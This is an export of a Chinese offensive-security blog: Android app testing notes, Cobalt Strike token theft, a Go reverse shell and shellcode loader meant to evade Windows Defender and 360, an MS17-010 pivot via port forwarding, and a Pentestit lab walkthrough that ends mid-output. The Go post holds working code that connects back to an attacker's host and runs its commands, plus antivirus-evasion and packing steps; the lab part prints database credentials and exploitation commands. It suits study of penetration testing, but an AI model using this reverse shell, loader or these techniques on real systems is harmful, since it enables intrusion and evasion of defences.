{"pages":[{"title":"404 - Page Not Found","text":"页面将在秒内自动跳转回首页 something wrong! function countDown(secs, surl) { var jumpTo = document.getElementById('jumpTo'); jumpTo.innerHTML = secs; if (--secs > 0) { setTimeout(\"countDown(\" + secs + \",'\" + surl + \"')\", 1000); } else { location.href = surl; } } countDown(10,'/');","link":"/404.html"},{"title":"About","text":"","link":"/about/index-1.html"},{"title":"关于我","text":"博客主要记录个人学习的过程，文章难免出错，所有的文章都存在修改的可能性，其中如有任何错误或者关于技术问题的讨论，非常欢迎与我交流！ 可在此处给我留言.","link":"/about/index.html"},{"title":"Recommand","text":"一些个人阅读过、学习过后觉得不错的项目、博客链接的分享，持续更新ing…各种payload集合项目 https://github.com/swisskyrepo/PayloadsAllTheThings RedTeam Tips https://vincentyiu.com/red-team-tips/ Awesome-Hacking https://github.com/Hack-with-Github/Awesome-Hacking 免杀研究 https://github.com/Ch0pin/AVIator RedTeam Infrastructure Wiki https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki PHP在线解密 https://www.unphp.net/ ATT&amp;CK测试库 https://atomicredteam.io/testing Red Team Tookits https://0xsp.com/offensive/red-teaming-toolkit-collection 渗透圣经 https://github.com/blaCCkHatHacEEkr/PENTESTING-BIBLE","link":"/recommand/index.html"}],"posts":[{"title":"Android客户端安全测试系列","text":"前言最近整理Android测试工具，顺便做一个复习，部分测试环境需要现搭，可能会影响更新速度。 一、签名安全测试方法1jarsigner.exe -verify demo.apk -verbose -certs jarsigner.exe来自JAVE_PATH/bin 如MobSF此类工具也可直接解析签名信息，后续系列详细补充 测试结果命令执行输出摘要如下： 1234567891011121314151617181920212223242526s 7500 Thu Mar 12 12:20:46 CST 2015 META-INF/MANIFEST.MF &gt;&gt;&gt; 签名者 X.509, CN=Android Debug, O=Android, C=US [证书的有效期为7/28/13 4:56 PM至7/21/43 4:56 PM] [无效的证书链: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target] 7553 Thu Mar 12 12:20:46 CST 2015 META-INF/CERT.SF 776 Thu Mar 12 12:20:46 CST 2015 META-INF/CERT.RSA s = 已验证签名 m = 在清单中列出条目 k = 在密钥库中至少找到了一个证书 i = 在身份作用域内至少找到了一个证书- 由 \"CN=Android Debug, O=Android, C=US\" 签名 摘要算法: SHA1 签名算法: SHA1withRSA, 1024 位密钥jar 已验证。警告:此 jar 包含其证书链无效的条目。原因: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target此 jar 包含其签名者证书为自签名证书的条目。此 jar 包含的签名没有时间戳。如果没有时间戳, 则在其中任一签名者证书到期 (最早为 2043-07-21) 之后, 用户可能无法验证此 jar。签名者证书将于 2043-07-21 到期。 关注结果： 确认是否输出jar 已验证 证书签名者身份，如CN=Android Debug, O=Android, C=US 其他说明从我以前做过的一些Android客户端安测案例来看，遇到的通用签名情况还是挺多，一般有外包/第三方开发团队的签名。举个例子来说APK的签名，就好发公文流程，你的公文（APP）上盖的路人甲的公章（路人甲签名），然而群众（手机）看到路人甲的公章（路人甲签名）就认为（信任）是你发的公文，从这个例子就不难理解通用签名/第三方签名的风险在哪个环节了。作为APP所有者，需要考虑以后的版本更新问题、私钥泄露问题等。 二、进程注入测试方法使用工具已经放到github，方便各位乙方同学项目地址：https://github.com/x51/droidsoject 测试结果 注入成功样例日志： 1234567891011121314151617181920212223D/INJECT ( 3738): [+] Calling dlclose in target process.D/INJECT ( 3738): [+] Target process returned from dlclose, return value=0, pc=b6f590bcE/WakeLock( 1893): GCM_HB_ALARM release without a matched acquire!D/INJECT ( 3933): [+] Injecting process: 3719D/INJECT ( 3933): [+] get_remote_addr: local[b6f2a000], remote[b6f58000]D/INJECT ( 3933): [+] Remote mmap address: b6f6ab25D/INJECT ( 3933): [+] Calling mmap in target process.D/INJECT ( 3933): [+] Target process returned from mmap, return value=8cd4c000, pc=0D/INJECT ( 3933): [+] get_remote_addr: local[b6f8d000], remote[b6fc6000]D/INJECT ( 3933): [+] get_remote_addr: local[b6f8d000], remote[b6fc6000]D/INJECT ( 3933): [+] get_remote_addr: local[b6f8d000], remote[b6fc6000]D/INJECT ( 3933): [+] get_remote_addr: local[b6f8d000], remote[b6fc6000]D/INJECT ( 3933): [+] Get imports: dlopen: b6fc6f11, dlsym: b6fc6e61, dlclose: b6fc6ddd, dlerror: b6fc6d8dD/INJECT ( 3933): [+] Calling dlopen in target process.D/INJECT ( 3933): [+] Target process returned from dlopen, return value=90c805b8, pc=0D/INJECT ( 3933): [+] Calling dlsym in target process.D/INJECT ( 3933): [+] Target process returned from dlsym, return value=8d665c5d, pc=0D/INJECT ( 3933): hook_entry_addr = 0x8d665c5dD/INJECT ( 3933): [+] Calling hook_entry in target process.D/DEBUG ( 3719): Hook Success, getpid = 3719D/DEBUG ( 3719): Hello x51D/DEBUG ( 3719): You can inject some evil code here.D/INJECT ( 3933): [+] Target process returned from hook_entry, return value=0, pc=0 查看目标进程mmap分布 其他说明1、libhello.so的路径在inject中写死了/data/local/tmp/libhello.so，可以改但没必要. 三、组件安全测试方法本节测试需要借助drozer来完成，关于如何安装该工具及详细介绍请移步https://labs.f-secure.com/tools/drozer] 查看攻击面： 1234567dz&gt; run app.package.attacksurface com.mwr.example.sieveAttack Surface: 3 activities exported 0 broadcast receivers exported 2 content providers exported 2 services exported is debuggable 或者直接查看AndroidManifest.xml文件中标记为exported=&quot;true&quot;的组件（注意到这儿的exported数量和上面差异，因为入口Activity默认是导出的） 以activity为例，查看列表： 12345678910dz&gt; run app.activity.info -a com.mwr.example.sievePackage: com.mwr.example.sieve com.mwr.example.sieve.FileSelectActivity Permission: null com.mwr.example.sieve.MainLoginActivity Permission: null com.mwr.example.sieve.PWList Permission: nulldz&gt; 调用外部activity： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950dz&gt; run app.activity.start -husage: run app.activity.start [-h] [--action ACTION] [--category CATEGORY [CATEGORY ...]] [--component PACKAGE COMPONENT] [--data-uri DATA_URI] [--extra TYPE KEY VALUE] [--flags FLAGS [FLAGS ...]] [--mimetype MIMETYPE]Starts an Activity using the formulated intent.Examples:Start the Browser with an explicit intent: dz&gt; run app.activity.start --component com.android.browser com.android.browser.BrowserActivity --flags ACTIVITY_NEW_TASKIf no flags are specified, drozer will add the ACTIVITY_NEW_TASK flag. To launch an activity with no flags: dz&gt; run app.activity.start --component com.android.browser com.android.browser.BrowserActivity --flags 0x0Starting the Browser with an implicit intent: dz&gt; run app.activity.start --action android.intent.action.VIEW --data-uri http://www.google.com --flags ACTIVITY_NEW_TASKFor more information on how to formulate an Intent, type 'help intents'.Last Modified: 2012-11-06Credit: MWR InfoSecurity (@mwrlabs)License: BSD (3 clause)optional arguments: -h, --help --action ACTION specify the action to include in the Intent --category CATEGORY [CATEGORY ...] specify the category to include in the Intent --component PACKAGE COMPONENT specify the component name to include in the Intent --data-uri DATA_URI specify a Uri to attach as data in the Intent --extra TYPE KEY VALUE add an field to the Intent's extras bundle --flags FLAGS [FLAGS ...] specify one-or-more flags to include in the Intent --mimetype MIMETYPE specify the MIME type to send in the Intentdz&gt; 测试结果开始测试，Activity调用时需要先完全退出APP，避免影响结果。直接调用： 1run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.FileSelectActivity 调用成功效果： 在这儿一般出现的安全问题有本地拒绝服务、越权等问题，比如经典的手势密码绕过。 调用Service发生本地拒绝服务实例： 其他说明除了Activity组件，还有Service、Broadcast Reciever、Content Provider，测试方式大同小异，一般来说APP的主入口Activity是必须导出的，根据功能还需导出部分Service等，所以还是要以实际危害结果为主。BTW：MobSF的动态检测功能包含了组件导出安全测试，会自动调用暴露组件并生成截图，效果不错。 四、客户端完整性校验测试方法这儿只考虑静态校验文件完整性，所以操作简易，不考虑其他绕过或修复等情况，简单来说流程：反编译——增/删/改文件——回编——签名——安装，结果以最终成功运行且改动生效为准。 apktool反编译： 1234567891011121314I: Using Apktool 2.4.0 on xxx.apkI: Loading resource table...I: Decoding AndroidManifest.xml with resources...S: WARNING: Could not write to (/home/john/.local/share/apktool/framework), using /tmp instead...S: Please be aware this is a volatile directory and frameworks could go missing, please utilize --frame-path if the default storage directory is unavailableI: Loading resource table from file: /tmp/1.apkI: Regular manifest package...I: Decoding file-resources...I: Decoding values */* XMLs...I: Baksmaling classes.dex...I: Baksmaling classes2.dex...I: Copying assets and libs...I: Copying unknown files...I: Copying original files... 建议修改客户端名称，位于./res/values/strings.xml 回编译过程： 1234567891011121314I: Using Apktool 2.4.0I: Checking whether sources has changed...I: Smaling smali folder into classes.dex...I: Checking whether sources has changed...I: Smaling smali_classes2 folder into classes2.dex...I: Checking whether resources has changed...I: Building resources...S: WARNING: Could not write to (/home/john/.local/share/apktool/framework), using /tmp instead...S: Please be aware this is a volatile directory and frameworks could go missing, please utilize --frame-path if the default storage directory is unavailableI: Copying libs... (/lib)I: Copying libs... (/kotlin)I: Building apk file...I: Copying unknown files/dir...I: Built apk... 成功后还需签名，不然提示Failure [INSTALL_PARSE_FAILED_NO_CERTIFICATES] 使用测试签名对回编译后的apk文件签名： 12345678910111213141516171819202122 正在签名: org/apaches/commons/codec/language/bm/sep_exact_french.txt 正在签名: org/apaches/commons/codec/language/bm/sep_exact_hebrew.txt 正在签名: org/apaches/commons/codec/language/bm/sep_exact_italian.txt 正在签名: org/apaches/commons/codec/language/bm/sep_exact_portuguese.txt 正在签名: org/apaches/commons/codec/language/bm/sep_exact_spanish.txt 正在签名: org/apaches/commons/codec/language/bm/sep_hebrew_common.txt 正在签名: org/apaches/commons/codec/language/bm/sep_lang.txt 正在签名: org/apaches/commons/codec/language/bm/sep_languages.txt 正在签名: org/apaches/commons/codec/language/bm/sep_rules_any.txt 正在签名: org/apaches/commons/codec/language/bm/sep_rules_french.txt 正在签名: org/apaches/commons/codec/language/bm/sep_rules_hebrew.txt 正在签名: org/apaches/commons/codec/language/bm/sep_rules_italian.txt 正在签名: org/apaches/commons/codec/language/bm/sep_rules_portuguese.txt 正在签名: org/apaches/commons/codec/language/bm/sep_rules_spanish.txt&gt;&gt;&gt; 签名者 X.509, CN=x51, OU=www.utf32.com, O=www.utf32.com, L=BeiJing, ST=Beijing, C=CN [可信证书]jar 已签名。警告:签名者证书为自签名证书。 测试结果修改成功截图： 其他说明五、代码保护测试方法此项一般测试客户端是否有代码混淆、客户端加壳等措施，使用jad直接打开apk文件查看： 是否混淆/加壳也比较容易判断，免赘述。 测试结果略 其他说明 如果目标APP已加壳/混淆， 不再继续脱壳/反混淆操作。 六、界面劫持保护测试方法大概原理：恶意软件监控栈顶程序，如果发现当前栈顶是目标页面，则替换之，达到劫持目的。具体关于栈、Activity等概念此处省略。Android系统更新到6.0以后，对权限的管理机制发生变化，通过以下方法获取栈顶程序不再有效。实现了一个简单的测试工具，输入目标包名即可在APP启动时进行劫持，劫持效果为一个透明页面： 1234567891011121314151617&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;RelativeLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"xmlns:app=\"http://schemas.android.com/apk/res-auto\"xmlns:tools=\"http://schemas.android.com/tools\"android:layout_width=\"match_parent\"android:layout_height=\"match_parent\"android:orientation=\"vertical\"tools:context=\".MainActivity\"&gt; &lt;TextView android:id=\"@+id/textView\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:layout_centerHorizontal=\"true\" android:layout_centerVertical=\"true\" android:text=\"该页面存在被劫持风险！ \\n tested by www.utf32.com.\" /&gt;&lt;/RelativeLayout&gt; 测试结果启动劫持服务，默认目标：com.android.settings，打开系统设置，劫持成功： 当前栈内Activity情况： 其他说明","link":"/2020/01/26/Android%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%B3%BB%E5%88%97/"},{"title":"Cobaltstrike-Pth(pass the Hash)","text":"寻找运行在域账号权限下的进程(有可能遇到Domain Admin) 1shell tasklist /v 模拟令牌 1steal_token pid 尝试利用 1shell dir \\\\10.0.0.1\\c$ 或者在得到域管明文密码的情况下，可以制作令牌来进行传递操作： 12345678beacon&gt; help make_tokenUse: make_token [DOMAIN\\user] [password]Clone the current access token and set it up to pass the specified usernameand password when you interact with network resources. This command does notvalidate the credentials you provide and it has no effect on local actions.eg:make_toke x51.test\\administrator password4administrator cobaltstrike官方博客介绍 待补充","link":"/2019/05/14/CobaltStrike-Notes/"},{"title":"Golang Socket &amp; ShellcodeLoader","text":"Windows Reverse Shell1、net.Dial回连： 1234backip := flag.String(\"d\", \"127.0.0.1\", \"ServerIpAdddress\")backport := flag.Int(\"p\", 1025, \"ServerPort\")flag.Parse()conn, err := net.Dial(\"tcp\", *backip+\":\"+strconv.Itoa(*backport)) 2、接收远程命令 1rcmd, _ := bufio.NewReader(conn).ReadString('\\n') 3、执行 12func Command(name string, arg ...string) *Cmd out, err := exec.Command(strings.TrimSuffix(rcmd, \"\\n\")).Output() 补充：这样实现的一个简单的reverse shell，只能“一次性”使用。解决办法有两个：1、添加一个死循环接受远端的命令 1234567for{ .... .... rcmd, _ := bufio.NewReader(conn).ReadString('\\n') out, err := exec.Command(strings.TrimSuffix(rcmd, \"\\n\")).Output() ...} 2、调cmd.exe 1cmd := exec.Command(\"C:\\\\Windows\\\\System32\\\\cmd.exe\") ShellCodeLoader ByPass WD or 360加载功能参考：https://github.com/brimstone/go-shellcodecode： 12345678910111213141516171819202122232425262728293031323334var procVirtualProtect = syscall.NewLazyDLL(\"kernel32.dll\").NewProc(\"VirtualProtect\")func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool { ret, _, _ := procVirtualProtect.Call( uintptr(lpAddress), uintptr(dwSize), uintptr(flNewProtect), uintptr(lpflOldProtect)) return ret &gt; 0}func Run(sc []byte) { // TODO need a Go safe fork // Make a function ptr f := func() {} // Change permissions on f function ptr var oldfperms uint32 if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&amp;f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&amp;oldfperms)) { panic(\"Call to VirtualProtect failed!\") } // Override function ptr **(**uintptr)(unsafe.Pointer(&amp;f)) = *(*uintptr)(unsafe.Pointer(&amp;sc)) // Change permissions on shellcode string data var oldshellcodeperms uint32 if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&amp;sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&amp;oldshellcodeperms)) { panic(\"Call to VirtualProtect failed!\") } // Call the function ptr it f()} 测试了三种方法：1、命令行传递shellcode，shellcode可用msf生成，或cobalstrike的payload（选c），适用反弹shell（rce or webshell）2、将shellcode硬编码到程序中，会弹框，编译添加参数-ldflags=&quot;-H windowsgui&quot;，适用钓鱼，shellcode需处理。3、远程加载（命令行）：main1.exe http://0.0.0.0/jquery.js，可在程序硬编码远程C2地址，效果如下： （缺点是添加了网络包net/http后程序体积很大） 12345 D:\\Tools\\upx-3.95-win64 的目录11/27/2019 03:58 PM 531,456 main.exe 1 个文件 531,456 字节 0 个目录 260,310,085,632 可用字节 从测试来看方式2效率最高，也容易扩展，大小可接受，但方法3不落地。 如何精简binary体积？1、精简代码往往一件看似美好的事物背后总是带着点缺陷，Golang的静态编译特性运行静态无依赖，但身材却略显“臃肿”，代码分析插件：goweight（GitHub）可以帮助我们进行分析程序体积分布比例。适度减少程序依赖项，让代码更加精小，比如在完全可以去掉任何打印功能的情况下，就可以省出一个fmt大小。 1234567891011121314151617181920212223242526272829303132333435D:\\CodeSrc\\go\\src\\demo\\sc\\main&gt;goweight 3.5 MB runtime 1.4 MB reflect 828 kB syscall 513 kB time 450 kB fmt 445 kB os 428 kB internal/reflectlite 285 kB strconv 281 kB strings 276 kB internal/poll 230 kB unicode 218 kB math 166 kB sync 160 kB internal/syscall/windows 145 kB internal/syscall/windows/registry 143 kB io 118 kB sort 50 kB internal/fmtsort 50 kB encoding/hex 43 kB internal/cpu 40 kB math/bits 27 kB unicode/utf8 27 kB errors 20 kB sync/atomic 16 kB internal/bytealg 15 kB runtime/internal/atomic 15 kB internal/testlog 12 kB runtime/internal/sys 9.0 kB demo/sc/shellcode 8.5 kB unicode/utf16 5.2 kB internal/syscall/windows/sysdll 4.2 kB internal/race 2.6 kB internal/oserror 1.7 kB runtime/internal/math btw，写了一个通过http加载远程shellcode的功能，结果发现打包后体积太大，goweight分析结果： 12345D:\\CodeSrc\\go\\src\\demo\\sc\\main&gt;goweight 3.9 MB net/http 3.5 MB runtime 1.7 MB crypto/tls 1.4 MB net 从结果可以看到http的占用率太高，那么这个功能不要也罢。2、ldflags参数去掉符号信息、调试信息先看看直接编译的结果： 1234567891011x51 D:\\..\\..\\..\\..\\..\\main ❯❯❯ go build main.gox51 D:\\..\\..\\..\\..\\..\\main ❯❯❯ ls 目录: D:\\CodeSrc\\go\\src\\demo\\sc\\mainMode LastWriteTime Length Name---- ------------- ------ -----a---- 11/28/2019 7:09 PM 2141184 main.exe-a---- 11/28/2019 7:08 PM 1929 main.go 再来看添加-ldflags参数后的结果： 1234567891011x51 D:\\..\\..\\..\\..\\..\\main ❯❯❯ go build -ldflags=\"-s -w\" main.gox51 D:\\..\\..\\..\\..\\..\\main ❯❯❯ ls 目录: D:\\CodeSrc\\go\\src\\demo\\sc\\mainMode LastWriteTime Length Name---- ------------- ------ -----a---- 11/28/2019 7:09 PM 1549312 main.exe-a---- 11/28/2019 7:08 PM 1929 main.go 很明显带参数编译的体积要更小。3、upx 12345678910111213141516171819202122D:\\Tools\\upx-3.95-win64&gt;upx.exe Ultimate Packer for eXecutables Copyright (C) 1996 - 2018UPX 3.95w Markus Oberhumer, Laszlo Molnar &amp; John Reiser Aug 26th 2018Usage: upx [-123456789dlthVL] [-qvfk] [-o file] file..Commands: -1 compress faster -9 compress better -d decompress -l list compressed file -t test compressed file -V display version number -h give more help -L display software licenseOptions: -q be quiet -v be verbose -oFILE write output to 'FILE' -f force compression of suspicious files -k keep backup filesfile.. executables to (de)compressType 'upx --help' for more detailed help.UPX comes with ABSOLUTELY NO WARRANTY; for details visit https://upx.github.io upx压缩处理的效果还是非常不错的，我们拿上面去除调试信息的exe直接压缩： 123 File size Ratio Format Name-------------------- ------ ----------- -----------1549312 -&gt; 538624 34.77% win64/pe main.exe Packed 1 file. 从1.5M多压缩到500多k，nice，注意到upx有个参数“-9”，可以理解为最大程度压缩吧，对比看一下： 1234567891011121314151617D:\\Tools\\upx-3.95-win64&gt;upx main.exe Ultimate Packer for eXecutables Copyright (C) 1996 - 2018UPX 3.95w Markus Oberhumer, Laszlo Molnar &amp; John Reiser Aug 26th 2018 File size Ratio Format Name -------------------- ------ ----------- ----------- 1549312 -&gt; 538624 34.77% win64/pe main.exe Packed 1 file.D:\\Tools\\upx-3.95-win64&gt;upx -9 main.exe Ultimate Packer for eXecutables Copyright (C) 1996 - 2018UPX 3.95w Markus Oberhumer, Laszlo Molnar &amp; John Reiser Aug 26th 2018 File size Ratio Format Name -------------------- ------ ----------- ----------- 1549312 -&gt; 531456 34.30% win64/pe main.exe Packed 1 file. 比不带参数可以小10k左右。","link":"/2019/11/26/Golang-study-bypass-wd/"},{"title":"MSF+端口转发攻击内网MS17-010","text":"本文讨论在一种特定环境下MS17-010的利用方式。 前置假设A是攻击者MSF所在公网机器；B是内网一台服务器，与A互通；C是内网另一台服务器，与B互通，不通A，存在MS17-010漏洞； 攻击流程MS17-010的Payload（dll文件）需要反向连接攻击者IP，但C只能与B通信，Payload执行后是无法在MSF平台接到ReverseShell的，此时需要流量转发（端口转发）。1、生成目标机器后门，反连Server设置成B的IP，端口4455；2、B上开启端口转发，将本地4455的流量转发到A的4466端口，运行EXP；3、A上开启MSF监听本机4466端口；4、A上成功得到来自B机器任意端口的Meterpreter Session； 后话基本都是常规操作，但内网渗透中MS17010这样的场景遇到挺多，做个记录。","link":"/2019/09/29/MSF+%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91MS17-010/"},{"title":"Pentestit Lab 14 Writeup&#x2F;Walkthrough","text":"Pentestit Lab 14放出来时间快一个月了,中途断断续续做了一次,因为是第一次做这个系列靶机,很多关卡难免绕弯路,部分脑洞也是感谢热心群友提醒(比如vpn关卡),在这儿从原始笔记摘出有用的信息来把过程记录下.关卡列表: 1234567891011121314151617181920SiteMailVpn-1NsAdNewsRouterTerminal-1FpmJavaCertificatePassword——verfifyDbUserDumpGitVpn-2WikiTerminal-2Elasticsearch 准备工作实验室环境需要VPN接入,但国内访问困难,需要在配置文件中设置代理(OpenVPN Windows客户端也有设置代理选项). 1234Lab's gateways: 192.168.101.14 192.168.101.15 连接成功实验室环境后,ping测网关确认网络ok: 建议操作环境:Windows物理机+Kali Linux虚拟机 Site先探测下端口开放情况: 访问80端口会重定向到site.test.lab,绑定host后访问 从源码可以发现站点是wordpress搭建的,探测一下插件情况: 看一下该插件历史漏洞: 尝试默认POC利用失败,会返回一个自定义的错误页面,猜测是做了防护?但深入探测发现: 1234包含/etc/passwd 状态码:222 包含count_of_send.php 状态码:500 包含任意不存在文件test.aaa 状态码:404 这儿注意一下状态码,状态500应该是包含成功,222是被拦截,404是文件不存在,继续fuzz一下文件发现: 在/etc/group发现token: Mail记得上面Nmap探测结果吗?192.168.101.14还开放143端口和8080端口,143是IMAP服务,访问8080发现邮箱登录入口,猜测这儿是让登录邮箱账号. 从site收集到四个邮箱地址: (首页三个,自定义404页面一个) 1234Sales Department: sidorov@test.lab PR Department： ivanov@test.labIT Department： petrov@test.labSupport： support@test.lab Web登录带csrf_token 处理起来比较麻烦,直接爆破imap服务: 登录邮箱,未读邮件中发现token Java翻邮箱,把三个文件都下载下来看 反编译client.jar 看程序流程,一个ssh登录操作,在这之前会处理一下密码,直接运行一下拿到登录密码: (BTW,该SSH登录密码就是JAVA的token,坑!!!) Terminal-2使用拿到的ssh账号密码登录服务器,find大法发现token: 继续信息搜集,发现用户目录下有个.crt文件夹,下载回本地 NS其实看到这个关卡名称时就应该能猜到是nslookup,内网出现nslookup一般就在DNS区域传送上,所以直接找DNS服务器然后利用就行. 发现172.16.0.10、172.16.0.20两个DNS服务器 在172.16.0.10上利用成功,并且拿到一份内网域名列表.整理一下: AD两个DC，目前我们在172.16.0.0/24，也就是DC2所处的网络，DC2域控服务器情况: SMB用户枚举,发现token VPN-2访问vpn2.test.lab,Web根目录下存在token News利用前面拿到的dev.crt和dev.key,连接另一个VPN网络(修改第一个VPN配置文件中的IP地址即可,连接时加参数–key和–cert)探测一下172.16.50.0/24存活 访问news,需要登录,没有其他任何提示,目录扫描无果 尝试通用口令 登录dev成功 没有什么发现,尝试拿生日去爆破也没结果(后来得知需要fuzz敏感文件,任何提示都木得….)这儿是个不常见的后缀.save比较简单的代码审计,当debug参数等于字符串dawdawgoiagi2re0,则执行参数cmd 构造命令执行POC: 继续find大法! DB发现上面源码审计时包含了一个DB.php文件,看一看 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394class DB{private $DB_HOST = '172.16.40.5';private $DB_USER = 'php-site';private $DB_PASS = 'fqafG32rGpwvbcsof';private $DB_NAME = 'php_site';private $LINK;/*** DB constructor.*/public function __construct(){$link = new mysqli($this -&gt; DB_HOST,$this -&gt; DB_USER,$this -&gt; DB_PASS,$this -&gt; DB_NAME);if (!$link){echo 'Невозможно подключиться к базе данных';}else{$link -&gt;query(\"SET NAMES 'utf8' \");$this -&gt; LINK = $link;}}public function isLoginCorrect($login, $password){$login = $this -&gt;LINK -&gt; real_escape_string($login);$query = $this -&gt; LINK -&gt; prepare(\"select password from user where login = ?\");$query-&gt;bind_param('s',$login);$query-&gt;execute();$result = $query-&gt;get_result();$data = $result-&gt;fetch_assoc();$pas = md5(md5($password));// if (md5(md5($password)) === $data['password'])if ($pas === $data['password']){return true;}return false;}public function getAllPosts(){$query = $this-&gt;LINK -&gt;query('select id from posts order by date DESC ');$resultQuery = $query -&gt; fetch_all();$result = array();foreach ($resultQuery as $row){array_push($result,$row[0]);}if (count($result) &gt; 0){return $result;}return -1;}public function getPostByID($id){require_once \"Post.php\";if (!is_numeric($id)) return false;$query = $this-&gt;LINK -&gt;prepare('select team,author,text,date from posts where id = ?');$query-&gt;bind_param('i',$id);$query-&gt;execute();$resultQuery = $query-&gt;get_result();$data = $resultQuery-&gt;fetch_assoc();$result = new Post($id,$data['team'],$data['date'],$data['author'],$data['text']);return $result;}public function getSearch ($text){$text = $this -&gt;LINK -&gt; real_escape_string($text);$query = $this-&gt;LINK -&gt;prepare('select id from posts where text like ?');$text = \"%\".$text.\"%\";$query-&gt;bind_param('s', $text);$query-&gt;execute();$resultQuery = $query-&gt;get_result();$result = array();foreach ($resultQuery as $row){array_push($result,$row['id']);}if (count($result) &gt; 0){return $result;}return -1;}} 拿到了数据库服务器IP\\账户\\密码,想办法拖数据不登陆MySQL查询: 最终获取token的完整POC: 1mysql -h 172.16.40.5 -P3306 -u php-site -p'fqafG32rGpwvbcsof' -D php -se \"select * from other;\" Router观察从DNS区域传送漏洞拿到的内网域名列表和172.16.50.x这个C段的探测结果,发现172.16.50.50这个IP没有对应在内网域名上,进一步探测发现开放161端口(SNMP) ,爆破SNMP Community字符串 1172.16.50.50 [skywalker] VyOS 1.2-rolling-201910230117 利用snmpwalk获取详细信息 12345678910111213141516171819202122232425262728oot@kali:~# snmpwalk -c skywalker 172.16.50.50 -v 1iso.3.6.1.2.1.1.1.0 = STRING: \"VyOS 1.2-rolling-201910230117\"iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.44641iso.3.6.1.2.1.1.3.0 = Timeticks: (537483) 1:29:34.83iso.3.6.1.2.1.1.4.0 = STRING: \"root\"iso.3.6.1.2.1.1.5.0 = STRING: \"J09tV3rN1wd\"iso.3.6.1.2.1.1.6.0 = STRING: \"Unknown\"iso.3.6.1.2.1.1.7.0 = INTEGER: 14iso.3.6.1.2.1.1.8.0 = Timeticks: (4) 0:00:00.04iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.11.3.1.1iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.15.2.1.1iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.10.3.1.1iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.2.1.49iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.4iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.6.3.16.2.2.1iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92iso.3.6.1.2.1.1.9.1.3.1 = STRING: \"The MIB for Message Processing and Dispatching.\"iso.3.6.1.2.1.1.9.1.3.2 = STRING: \"The management information definitions for the SNMP User-based Security Model.\"iso.3.6.1.2.1.1.9.1.3.3 = STRING: \"The SNMP Management Architecture MIB.\"iso.3.6.1.2.1.1.9.1.3.4 = STRING: \"The MIB module for SNMPv2 entities\"iso.3.6.1.2.1.1.9.1.3.5 = STRING: \"The MIB module for managing TCP implementations\"iso.3.6.1.2.1.1.9.1.3.6 = STRING: \"The MIB module for managing IP and ICMP implementations\"iso.3.6.1.2.1.1.9.1.3.7 = STRING: \"The MIB module for managing UDP implementations\"...... User通过SNMP发现另一个网络172.16.60.x 12345678910111213141516171819202122232425262728iso.3.6.1.2.1.2.2.1.20.3 = Counter32: 0iso.3.6.1.2.1.2.2.1.21.1 = Gauge32: 0iso.3.6.1.2.1.2.2.1.21.2 = Gauge32: 0iso.3.6.1.2.1.2.2.1.21.3 = Gauge32: 0iso.3.6.1.2.1.2.2.1.22.1 = OID: ccitt.0iso.3.6.1.2.1.2.2.1.22.2 = OID: ccitt.0iso.3.6.1.2.1.2.2.1.22.3 = OID: ccitt.0iso.3.6.1.2.1.3.1.1.1.2.1.172.16.50.1 = INTEGER: 2iso.3.6.1.2.1.3.1.1.1.2.1.172.16.50.11 = INTEGER: 2iso.3.6.1.2.1.3.1.1.1.2.1.172.16.50.20 = INTEGER: 2iso.3.6.1.2.1.3.1.1.1.3.1.172.16.60.2 = INTEGER: 3iso.3.6.1.2.1.3.1.1.1.3.1.172.16.60.3 = INTEGER: 3iso.3.6.1.2.1.3.1.1.1.3.1.172.16.60.4 = INTEGER: 3iso.3.6.1.2.1.3.1.1.1.3.1.172.16.60.5 = INTEGER: 3iso.3.6.1.2.1.3.1.1.2.2.1.172.16.50.1 = Hex-STRING: 08 00 27 FE 97 AF iso.3.6.1.2.1.3.1.1.2.2.1.172.16.50.11 = Hex-STRING: 08 00 27 1B E6 89 iso.3.6.1.2.1.3.1.1.2.2.1.172.16.50.20 = Hex-STRING: 08 00 27 AF B6 D6 iso.3.6.1.2.1.3.1.1.2.3.1.172.16.60.2 = Hex-STRING: 08 00 27 3B 85 71 iso.3.6.1.2.1.3.1.1.2.3.1.172.16.60.3 = Hex-STRING: 08 00 27 0B 82 36 iso.3.6.1.2.1.3.1.1.2.3.1.172.16.60.4 = Hex-STRING: 08 00 27 89 9D 3E iso.3.6.1.2.1.3.1.1.2.3.1.172.16.60.5 = Hex-STRING: 08 00 27 5A 1E 03 iso.3.6.1.2.1.3.1.1.3.2.1.172.16.50.1 = IpAddress: 172.16.50.1iso.3.6.1.2.1.3.1.1.3.2.1.172.16.50.11 